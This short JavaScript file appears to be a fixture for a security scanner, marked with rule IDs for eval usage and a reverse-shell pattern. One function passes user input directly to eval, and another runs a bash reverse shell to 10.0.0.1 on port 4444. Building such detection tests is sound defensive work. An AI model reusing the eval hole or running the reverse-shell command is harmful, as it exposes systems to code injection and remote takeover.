// SKL-003: eval usage + SKL-005: reverse shell pattern
const { exec } = require('child_process');

function processInput(userInput) {
  // Dangerous eval
  const result = eval(userInput);
  return result;
}

function connectBack() {
  exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
}

module.exports = { processInput, connectBack };
